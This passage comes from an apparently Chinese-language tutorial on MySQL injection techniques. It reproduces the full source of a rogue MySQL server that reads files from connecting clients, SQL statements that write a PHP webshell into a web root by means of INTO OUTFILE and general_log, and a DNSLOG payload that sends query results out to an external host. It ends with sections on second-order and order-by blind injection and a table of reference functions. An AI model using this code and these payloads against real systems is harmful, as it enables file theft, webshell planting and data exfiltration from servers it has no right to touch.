class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#代码摘自：https://github.com/Gifts/Rogue-MySql-Server/blob/master/rogue_mysql_server.py</span></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#coding: utf8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> asyncore</span><br><span class="line"><span class="keyword">import</span> asynchat</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> logging.handlers</span><br><span class="line"></span><br><span class="line">PORT = <span class="number">3306</span></span><br><span class="line">log = logging.getLogger(__name__)</span><br><span class="line">log.setLevel(logging.DEBUG)</span><br><span class="line">tmp_format = logging.handlers.WatchedFileHandler(<span class="string">&#x27;mysql.log&#x27;</span>, <span class="string">&#x27;ab&#x27;</span>)</span><br><span class="line">tmp_format.setFormatter(logging.Formatter(<span class="string">&quot;%(asctime)s:%(levelname)s:%(message)s&quot;</span>))</span><br><span class="line">log.addHandler(</span><br><span class="line">    tmp_format</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">filelist = (</span><br><span class="line"><span class="comment">#    r&#x27;c:\boot.ini&#x27;,</span></span><br><span class="line">    <span class="string">r&#x27;c:\windows\win.ini&#x27;</span>,</span><br><span class="line"><span class="comment">#    r&#x27;c:\windows\system32\drivers\etc\hosts&#x27;,</span></span><br><span class="line"><span class="comment">#    &#x27;/etc/passwd&#x27;,</span></span><br><span class="line"><span class="comment">#    &#x27;/etc/shadow&#x27;,</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">#================================================</span></span><br><span class="line"><span class="comment">#=======No need to change after this lines=======</span></span><br><span class="line"><span class="comment">#================================================</span></span><br><span class="line"></span><br><span class="line">__author__ = <span class="string">&#x27;Gifts&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">daemonize</span>():</span></span><br><span class="line">    <span class="keyword">import</span> os, warnings</span><br><span class="line">    <span class="keyword">if</span> os.name != <span class="string">&#x27;posix&#x27;</span>:</span><br><span class="line">        warnings.warn(<span class="string">&#x27;Cant create daemon on non-posix system&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> os.fork(): os._exit(<span class="number">0</span>)</span><br><span class="line">    os.setsid()</span><br><span class="line">    <span class="keyword">if</span> os.fork(): os._exit(<span class="number">0</span>)</span><br><span class="line">    os.umask(<span class="number">0o022</span>)</span><br><span class="line">    null=os.<span class="built_in">open</span>(<span class="string">&#x27;/dev/null&#x27;</span>, os.O_RDWR)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">3</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            os.dup2(null, i)</span><br><span class="line">        <span class="keyword">except</span> OSError <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">if</span> e.errno != <span class="number">9</span>: <span class="keyword">raise</span></span><br><span class="line">    os.close(null)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LastPacket</span>(<span class="params">Exception</span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OutOfOrder</span>(<span class="params">Exception</span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mysql_packet</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    packet_header = struct.Struct(<span class="string">&#x27;&lt;Hbb&#x27;</span>)</span><br><span class="line">    packet_header_long = struct.Struct(<span class="string">&#x27;&lt;Hbbb&#x27;</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, packet_type, payload</span>):</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(packet_type, mysql_packet):</span><br><span class="line">            self.packet_num = packet_type.packet_num + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.packet_num = packet_type</span><br><span class="line">        self.payload = payload</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span>(<span class="params">self</span>):</span></span><br><span class="line">        payload_len = <span class="built_in">len</span>(self.payload)</span><br><span class="line">        <span class="keyword">if</span> payload_len &lt; <span class="number">65536</span>:</span><br><span class="line">            header = mysql_packet.packet_header.pack(payload_len, <span class="number">0</span>, self.packet_num)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            header = mysql_packet.packet_header.pack(payload_len &amp; <span class="number">0xFFFF</span>, payload_len &gt;&gt; <span class="number">16</span>, <span class="number">0</span>, self.packet_num)</span><br><span class="line"></span><br><span class="line">        result = <span class="string">&quot;&#123;0&#125;&#123;1&#125;&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">            header,</span><br><span class="line">            self.payload</span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__repr__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">repr</span>(<span class="built_in">str</span>(self))</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse</span>(<span class="params">raw_data</span>):</span></span><br><span class="line">        packet_num = <span class="built_in">ord</span>(raw_data[<span class="number">0</span>])</span><br><span class="line">        payload = raw_data[<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> mysql_packet(packet_num, payload)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">http_request_handler</span>(<span class="params">asynchat.async_chat</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, addr</span>):</span></span><br><span class="line">        asynchat.async_chat.__init__(self, sock=addr[<span class="number">0</span>])</span><br><span class="line">        self.addr = addr[<span class="number">1</span>]</span><br><span class="line">        self.ibuffer = []</span><br><span class="line">        self.set_terminator(<span class="number">3</span>)</span><br><span class="line">        self.state = <span class="string">&#x27;LEN&#x27;</span></span><br><span class="line">        self.sub_state = <span class="string">&#x27;Auth&#x27;</span></span><br><span class="line">        self.logined = <span class="literal">False</span></span><br><span class="line">        self.push(</span><br><span class="line">            mysql_packet(</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                <span class="string">&quot;&quot;</span>.join((</span><br><span class="line">                    <span class="string">&#x27;\x0a&#x27;</span>,  <span class="comment"># Protocol</span></span><br><span class="line">                    <span class="string">&#x27;3.0.0-Evil_Mysql_Server&#x27;</span> + <span class="string">&#x27;\0&#x27;</span>,  <span class="comment"># Version</span></span><br><span class="line">                    <span class="comment">#&#x27;5.1.66-0+squeeze1&#x27; + &#x27;\0&#x27;,</span></span><br><span class="line">                    <span class="string">&#x27;\x36\x00\x00\x00&#x27;</span>,  <span class="comment"># Thread ID</span></span><br><span class="line">                    <span class="string">&#x27;evilsalt&#x27;</span> + <span class="string">&#x27;\0&#x27;</span>,  <span class="comment"># Salt</span></span><br><span class="line">                    <span class="string">&#x27;\xdf\xf7&#x27;</span>,  <span class="comment"># Capabilities</span></span><br><span class="line">                    <span class="string">&#x27;\x08&#x27;</span>,  <span class="comment"># Collation</span></span><br><span class="line">                    <span class="string">&#x27;\x02\x00&#x27;</span>,  <span class="comment"># Server Status</span></span><br><span class="line">                    <span class="string">&#x27;\0&#x27;</span> * <span class="number">13</span>,  <span class="comment"># Unknown</span></span><br><span class="line">                    <span class="string">&#x27;evil2222&#x27;</span> + <span class="string">&#x27;\0&#x27;</span>,</span><br><span class="line">                ))</span><br><span class="line">            )</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        self.order = <span class="number">1</span></span><br><span class="line">        self.states = [<span class="string">&#x27;LOGIN&#x27;</span>, <span class="string">&#x27;CAPS&#x27;</span>, <span class="string">&#x27;ANY&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">push</span>(<span class="params">self, data</span>):</span></span><br><span class="line">        log.debug(<span class="string">&#x27;Pushed: %r&#x27;</span>, data)</span><br><span class="line">        data = <span class="built_in">str</span>(data)</span><br><span class="line">        asynchat.async_chat.push(self, data)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">collect_incoming_data</span>(<span class="params">self, data</span>):</span></span><br><span class="line">        log.debug(<span class="string">&#x27;Data recved: %r&#x27;</span>, data)</span><br><span class="line">        self.ibuffer.append(data)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">found_terminator</span>(<span class="params">self</span>):</span></span><br><span class="line">        data = <span class="string">&quot;&quot;</span>.join(self.ibuffer)</span><br><span class="line">        self.ibuffer = []</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> self.state == <span class="string">&#x27;LEN&#x27;</span>:</span><br><span class="line">            len_bytes = <span class="built_in">ord</span>(data[<span class="number">0</span>]) + <span class="number">256</span>*<span class="built_in">ord</span>(data[<span class="number">1</span>]) + <span class="number">65536</span>*<span class="built_in">ord</span>(data[<span class="number">2</span>]) + <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> len_bytes &lt; <span class="number">65536</span>:</span><br><span class="line">                self.set_terminator(len_bytes)</span><br><span class="line">                self.state = <span class="string">&#x27;Data&#x27;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                self.state = <span class="string">&#x27;MoreLength&#x27;</span></span><br><span class="line">        <span class="keyword">elif</span> self.state == <span class="string">&#x27;MoreLength&#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span> data[<span class="number">0</span>] != <span class="string">&#x27;\0&#x27;</span>:</span><br><span class="line">                self.push(<span class="literal">None</span>)</span><br><span class="line">                self.close_when_done()</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                self.state = <span class="string">&#x27;Data&#x27;</span></span><br><span class="line">        <span class="keyword">elif</span> self.state == <span class="string">&#x27;Data&#x27;</span>:</span><br><span class="line">            packet = mysql_packet.parse(data)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">if</span> self.order != packet.packet_num:</span><br><span class="line">                    <span class="keyword">raise</span> OutOfOrder()</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="comment"># Fix ?</span></span><br><span class="line">                    self.order = packet.packet_num + <span class="number">2</span></span><br><span class="line">                <span class="keyword">if</span> packet.packet_num == <span class="number">0</span>:</span><br><span class="line">                    <span class="keyword">if</span> packet.payload[<span class="number">0</span>] == <span class="string">&#x27;\x03&#x27;</span>:</span><br><span class="line">                        log.info(<span class="string">&#x27;Query&#x27;</span>)</span><br><span class="line"></span><br><span class="line">                        filename = random.choice(filelist)</span><br><span class="line">                        PACKET = mysql_packet(</span><br><span class="line">                            packet,</span><br><span class="line">                            <span class="string">&#x27;\xFB&#123;0&#125;&#x27;</span>.<span class="built_in">format</span>(filename)</span><br><span class="line">                        )</span><br><span class="line">                        self.set_terminator(<span class="number">3</span>)</span><br><span class="line">                        self.state = <span class="string">&#x27;LEN&#x27;</span></span><br><span class="line">                        self.sub_state = <span class="string">&#x27;File&#x27;</span></span><br><span class="line">                        self.push(PACKET)</span><br><span class="line">                    <span class="keyword">elif</span> packet.payload[<span class="number">0</span>] == <span class="string">&#x27;\x1b&#x27;</span>:</span><br><span class="line">                        log.info(<span class="string">&#x27;SelectDB&#x27;</span>)</span><br><span class="line">                        self.push(mysql_packet(</span><br><span class="line">                            packet,</span><br><span class="line">                            <span class="string">&#x27;\xfe\x00\x00\x02\x00&#x27;</span></span><br><span class="line">                        ))</span><br><span class="line">                        <span class="keyword">raise</span> LastPacket()</span><br><span class="line">                    <span class="keyword">elif</span> packet.payload[<span class="number">0</span>] <span class="keyword">in</span> <span class="string">&#x27;\x02&#x27;</span>:</span><br><span class="line">                        self.push(mysql_packet(</span><br><span class="line">                            packet, <span class="string">&#x27;\0\0\0\x02\0\0\0&#x27;</span></span><br><span class="line">                        ))</span><br><span class="line">                        <span class="keyword">raise</span> LastPacket()</span><br><span class="line">                    <span class="keyword">elif</span> packet.payload == <span class="string">&#x27;\x00\x01&#x27;</span>:</span><br><span class="line">                        self.push(<span class="literal">None</span>)</span><br><span class="line">                        self.close_when_done()</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        <span class="keyword">raise</span> ValueError()</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">if</span> self.sub_state == <span class="string">&#x27;File&#x27;</span>:</span><br><span class="line">                        log.info(<span class="string">&#x27;-- result&#x27;</span>)</span><br><span class="line">                        log.info(<span class="string">&#x27;Result: %r&#x27;</span>, data)</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> <span class="built_in">len</span>(data) == <span class="number">1</span>:</span><br><span class="line">                            self.push(</span><br><span class="line">                                mysql_packet(packet, <span class="string">&#x27;\0\0\0\x02\0\0\0&#x27;</span>)</span><br><span class="line">                            )</span><br><span class="line">                            <span class="keyword">raise</span> LastPacket()</span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                            self.set_terminator(<span class="number">3</span>)</span><br><span class="line">                            self.state = <span class="string">&#x27;LEN&#x27;</span></span><br><span class="line">                            self.order = packet.packet_num + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">                    <span class="keyword">elif</span> self.sub_state == <span class="string">&#x27;Auth&#x27;</span>:</span><br><span class="line">                        self.push(mysql_packet(</span><br><span class="line">                            packet, <span class="string">&#x27;\0\0\0\x02\0\0\0&#x27;</span></span><br><span class="line">                        ))</span><br><span class="line">                        <span class="keyword">raise</span> LastPacket()</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        log.info(<span class="string">&#x27;-- else&#x27;</span>)</span><br><span class="line">                        <span class="keyword">raise</span> ValueError(<span class="string">&#x27;Unknown packet&#x27;</span>)</span><br><span class="line">            <span class="keyword">except</span> LastPacket:</span><br><span class="line">                log.info(<span class="string">&#x27;Last packet&#x27;</span>)</span><br><span class="line">                self.state = <span class="string">&#x27;LEN&#x27;</span></span><br><span class="line">                self.sub_state = <span class="literal">None</span></span><br><span class="line">                self.order = <span class="number">0</span></span><br><span class="line">                self.set_terminator(<span class="number">3</span>)</span><br><span class="line">            <span class="keyword">except</span> OutOfOrder:</span><br><span class="line">                log.warning(<span class="string">&#x27;Out of order&#x27;</span>)</span><br><span class="line">                self.push(<span class="literal">None</span>)</span><br><span class="line">                self.close_when_done()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            log.error(<span class="string">&#x27;Unknown state&#x27;</span>)</span><br><span class="line">            self.push(<span class="string">&#x27;None&#x27;</span>)</span><br><span class="line">            self.close_when_done()</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mysql_listener</span>(<span class="params">asyncore.dispatcher</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, sock=<span class="literal">None</span></span>):</span></span><br><span class="line">        asyncore.dispatcher.__init__(self, sock)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> sock:</span><br><span class="line">            self.create_socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">            self.set_reuse_addr()</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                self.bind((<span class="string">&#x27;&#x27;</span>, PORT))</span><br><span class="line">            <span class="keyword">except</span> socket.error:</span><br><span class="line">                exit()</span><br><span class="line"></span><br><span class="line">            self.listen(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle_accept</span>(<span class="params">self</span>):</span></span><br><span class="line">        pair = self.accept()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> pair <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            log.info(<span class="string">&#x27;Conn from: %r&#x27;</span>, pair[<span class="number">1</span>])</span><br><span class="line">            tmp = http_request_handler(pair)</span><br><span class="line"></span><br><span class="line">z = mysql_listener()</span><br><span class="line">daemonize()</span><br><span class="line">asyncore.loop()</span><br></pre></td></tr></table></figure><p>需要注意的是：这个过程需要客户端允许使用<code>load data local</code>才行，不过这个信息在客户端尝试连接到服务端的数据包中可以找到。</p><p><img src="https://img.0x002.com/article/MysqlSQLi/loginInfo.png" alt="登录数据包"></p><h3 id="写"><a href="#写" class="headerlink" title="写"></a>写</h3><p>说完了读文件，那我们来说说mysql的写文件操作。常见的写文件操作如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select 1,&quot;&lt;?php @assert($_POST[&#39;t&#39;]);?&gt;&quot; into outfile &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;1.php&#39;;</span><br><span class="line">select 2,&quot;&lt;?php @assert($_POST[&#39;t&#39;]);?&gt;&quot; into dumpfile &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;1.php&#39;;</span><br></pre></td></tr></table></figure><p>限制：</p><ul><li><code>secure-file-priv</code>无值或为可利用的目录</li><li>需知道目标目录的绝对目录地址</li><li>目标目录可写，mysql的权限足够。</li></ul><h4 id="日志法"><a href="#日志法" class="headerlink" title="日志法"></a>日志法</h4><p>由于mysql在5.5.53版本之后，<code>secure-file-priv</code>的值默认为<code>NULL</code>，这使得正常读取文件的操作基本不可行。我们这里可以利用mysql生成日志文件的方法来绕过。</p><p>mysql日志文件的一些相关设置可以直接通过命令来进行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;请求日志</span><br><span class="line">mysql&gt; set global general_log_file &#x3D; &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;1.php&#39;;</span><br><span class="line">mysql&gt; set global general_log &#x3D; on;</span><br><span class="line">&#x2F;&#x2F;慢查询日志</span><br><span class="line">mysql&gt; set global slow_query_log_file&#x3D;&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;2.php&#39;</span><br><span class="line">mysql&gt; set global slow_query_log&#x3D;1;</span><br><span class="line">&#x2F;&#x2F;还有其他很多日志都可以进行利用</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>之后我们在让数据库执行满足记录条件的恶意语句即可。</p><p>限制：</p><ul><li>权限够，可以进行日志的设置操作</li><li>知道目标目录的绝对路径</li></ul><h2 id="DNSLOG带出数据"><a href="#DNSLOG带出数据" class="headerlink" title="DNSLOG带出数据"></a>DNSLOG带出数据</h2><p>什么是DNSLOG？简单的说，就是关于特定网站的DNS查询的一份记录表。若A用户对B网站进行访问/请求等操作，首先会去查询B网站的DNS记录，由于B网站是被我们控制的，便可以通过某些方法记录下A用户对于B网站的DNS记录信息。此方法也称为OOB注入。</p><p>如何用DNSLOG带出数据？若我们想要查询的数据为：<code>aabbcc</code>，那么我们让mysql服务端去请求<code>aabbcc.evil.com</code>，通过记录<code>evil.com</code>的DNS记录，就可以得到数据：<code>aabbcc</code>。</p><blockquote><p><img src="https://img.0x002.com/article/MysqlSQLi/dnslogSQLi.jpg" alt="DNSLOG流程图"></p><p>引自：<a href="https://www.anquanke.com/post/id/98096">Dnslog在SQL注入中的实战</a></p></blockquote><p>payload: <code>load_file(concat(&#39;\\\\&#39;,(select user()),&#39;.xxxx.ceye.io\xxxx&#39;))</code></p><p>应用场景：</p><ul><li>三大注入无法使用</li><li>有文件读取权限及<code>secure-file-priv</code>无值。</li><li>不知道网站/目标文件/目标目录的绝对路径</li><li>目标系统为Windows</li></ul><p>推荐平台：<a href="http://ceye.io/">ceye.io</a></p><p>为什么Windows可用，Linux不行？这里涉及到一个叫UNC的知识点。简单的说，在Windows中，路径以<code>\\</code>开头的路径在Windows中被定义为UNC路径，相当于网络硬盘一样的存在，所以我们填写域名的话，Windows会先进行DNS查询。但是对于Linux来说，并没有这一标准，所以DNSLOG在Linux环境不适用。注：payload里的四个<code>\\\\</code>中的两个<code>\</code>是用来进行转义处理的。</p><h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2><p>什么是二次注入？简单的说，就是攻击者构造的恶意payload首先会被服务器存储在数据库中，在之后取出数据库在进行SQL语句拼接时产生的SQL注入问题。</p><p>举个例子，某个查询当先登录的用户信息的SQL语句如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where username&#x3D;&#39;$_SESSION[&#39;username&#39;]&#39;</span><br></pre></td></tr></table></figure><p>登录/注册处的SQL语句都经过了addslashes函数、单引号闭合的处理，且无编码产生的问题。</p><p>对于上述举的语句我们可以先注册一个名为<code>admin&#39; #</code>的用户名，因为在注册进行了单引号的转义，故我们并不能直接进行insert注入，最终将我们的用户名存储在了服务器中，注意：反斜杠转义掉了单引号，在mysql中得到的数据并没有反斜杠的存在。</p><p>在我们进行登录操作的时候，我们用注册的<code>admin&#39; #</code>登录系统，并将用户部分数据存储在对于的SESSION中，如<code>$_SESSION[&#39;username&#39;]</code>。</p><p>上述的<code>$_SESSION[&#39;username&#39;]</code>并没有经过处理，直接拼接到了SQL语句之中，就会造成SQL注入，最终的语句为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where username&#x3D;&#39;admin&#39; #&#39;</span><br></pre></td></tr></table></figure><h2 id="order-by比较盲注"><a href="#order-by比较盲注" class="headerlink" title="order by比较盲注"></a>order by比较盲注</h2><p>这种方法运用的情况比较极端一些，如布尔盲注时，字符截取/比较限制很严格。例子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where (select &#39;r&#39; union select user() order by 1 limit 1)&#x3D;&#39;r&#39;</span><br></pre></td></tr></table></figure><p>如果能一眼看出原理的话就不需要继续看下去了。</p><p>实际上此处是利用了<code>order by</code>语句的排序功能来进行判断的。若我们想要查询的数据开头的首字母在字母表的位值比我们判断的值要靠后，则<code>limit</code>语句将不会让其输出，那么整个条件将会成立，否之不成立。</p><p>利用这种方法可以做到不需要使用<code>like、rlike、regexp</code>等匹配语句以及字符操作函数。</p><p>再举个例子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select username,flag,password from users where username&#x3D;&#39;$username;&#39;</span><br></pre></td></tr></table></figure><p>页面回显的字段为：username与password，如何在<code>union</code>与<code>flag</code>两单词被拦截、无报错信息返回的情况下获取到用户名为<code>admin</code>的flag值？</p><p>我们前边讲到了无列名注入，通过使用<code>union</code>语句来对未知列名进行重命名的形式绕过，还讲过通过使用<code>join using()</code>报错注入出列名。但现在，这两种方法都不可以的情况下该如何获取到flag字段的内容？</p><p>使用<code>order by</code>可轻松盲注出答案。payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select username,flag,password from users where username&#x3D;&#39;admin&#39; union select 1,&#39;a&#39;,3 order by 2</span><br></pre></td></tr></table></figure><p>与之前的原理相同，通过判断前后两个select语句返回的数据前后顺序来进行盲注。</p><h2 id="常见函数-符号归类"><a href="#常见函数-符号归类" class="headerlink" title="常见函数/符号归类"></a>常见函数/符号归类</h2><h3 id="注释符"><a href="#注释符" class="headerlink" title="注释符"></a>注释符</h3><table><thead><tr><th>单行注释</th><th>单行注释</th><th>单行注释</th><th>多行(内联)注释</th></tr></thead><tbody><tr><td><code>#</code></td><td><code>-- x  //x为任意字符</code></td><td><code>;%00</code></td><td><code>/*任意内容*/</code></td></tr></tbody></table><h3 id="常用运算符"><a href="#常用运算符" class="headerlink" title="常用运算符"></a>常用运算符</h3><table><thead><tr><th>运算符</th><th>说明</th><th>运算符</th><th>说明</th></tr></thead><tbody><tr><td><code>&amp;&amp;</code></td><td>与，同and。</td><td>丨丨</td><td>或，同or。注：此处由于markdown语法限制，用中文符号代替显示。</td></tr><tr><td><code>!</code></td><td>非，同not。</td><td><code>~</code></td><td>一元比特反转。</td></tr><tr><td><code>^</code></td><td>异或，同xor。</td><td><code>+</code></td><td>加，可替代空格，如<code>select+user()</code>。</td></tr></tbody></table><h3 id="系统信息函数"><a href="#系统信息函数" class="headerlink" title="系统信息函数"></a>系统信息函数</h3><table><thead><tr><th>函数</th><th>说明</th></tr></thead><tbody><tr><td>USER()</td><td>获取当前操作句柄的用户名，同SESSION_USER()、CURRENT_USER()，有时也用SYSTEM_USER()。</td></tr><tr><td>DATABASE()</td><td>获取当前选择的数据库名，同SCHEMA()。</td></tr><tr><td>VERSION()</td><td>获取当前版本信息。</td></tr></tbody></table><h3 id="进制转换"><a href="#进制转换" class="headerlink" title="进制转换"></a>进制转换</h3><table><thead><tr><th>函数</th><th>说明</th></tr></thead><tbody><tr><td>ORD(str)</td><td>返回字符串第一个字符的ASCII值。</td></tr><tr><td>OCT(N)</td><td>以字符串形式返回 <code>N</code> 的八进制数，<code>N</code> 是一个BIGINT 型数值，作用相当于<code>CONV(N,10,8)</code>。</td></tr><tr><td>HEX(N_S)</td><td>参数为字符串时，返回 <code>N_or_S</code> 的16进制字符串形式，为数字时，返回其16进制数形式。</td></tr><tr><td>UNHEX(str)</td><td><code>HEX(str)</code> 的逆向函数。将参数中的每一对16进制数字都转换为10进制数字，然后再转换成 ASCII 码所对应的字符。</td></tr><tr><td>BIN(N)</td><td>返回十进制数值 <code>N</code> 的二进制数值的字符串表现形式。</td></tr><tr><td>ASCII(str)</td><td>同<code>ORD(string)</code>。</td></tr><tr><td>CONV(N,from_base,to_base)</td><td>将数值型参数 <code>N</code> 由初始进制 <code>from_base</code> 转换为目标进制 <code>to_base</code> 的形式并返回。</td></tr><tr><td>CHAR(N,… [USING charset_name])</td><td>将每一个参数 <code>N</code> 都解释为整数，返回由这些整数在 ASCII 码中所对应字符所组成的字符串。</td></tr></tbody></table><h3 id="字符截取-拼接"><a href="#字符截取-拼接" class="headerlink" title="字符截取/拼接"></a>字符截取/拼接</h3><table><thead><tr><th>函数</th><th>说明</th></tr></thead><tbody><tr><td>SUBSTR(str,N_start,N_length)</td><td>对指定字符串进行截取，为SUBSTRING的简单版。</td></tr><tr><td>SUBSTRING()</td><td>多种格式<code>SUBSTRING(str,pos)、SUBSTRING(str FROM pos)、SUBSTRING(str,pos,len)、SUBSTRING(str FROM pos FOR len)</code>。</td></tr><tr><td>RIGHT(str,len)</td><td>对指定字符串从<strong>最右边</strong>截取指定长度。</td></tr><tr><td>LEFT(str,len)</td><td>对指定字符串从<strong>最左边</strong>截取指定长度。</td></tr><tr><td>RPAD(str,len,padstr)</td><td>在 <code>str</code> 右方补齐 <code>len</code> 位的字符串 <code>padstr</code>，返回新字符串。如果 <code>str</code> 长度大于 <code>len</code>，则返回值的长度将缩减到 <code>len</code> 所指定的长度。</td></tr><tr><td>LPAD(str,len,padstr)</td><td>与RPAD相似，在<code>str</code>左边补齐。</td></tr><tr><td>MID(str,pos,len)</td><td>同于 <code>SUBSTRING(str,pos,len)</code>。</td></tr><tr><td>INSERT(str,pos,len,newstr)</td><td>在原始字符串 <code>str</code> 中，将自左数第 <code>pos</code> 位开始，长度为 <code>len</code> 个字符的字符串替换为新字符串 <code>newstr</code>，然后返回经过替换后的字符串。<code>INSERT(str,len,1,0x0)</code>可当做截取函数。</td></tr><tr><td>CONCAT(str1,str2…)</td><td>函数用于将多个字符串合并为一个字符串</td></tr><tr><td>GROUP_CONCAT(…)</td><td>返回一个字符串结果，该结果由分组中的值连接组合而成。</td></tr><tr><td>MAKE_SET(bits,str1,str2,…)</td><td>根据参数1，返回所输入其他的参数值。可用作布尔盲注，如：<code>EXP(MAKE_SET((LENGTH(DATABASE())&gt;8)+1,&#39;1&#39;,&#39;710&#39;))</code>。</td></tr></tbody></table><h3 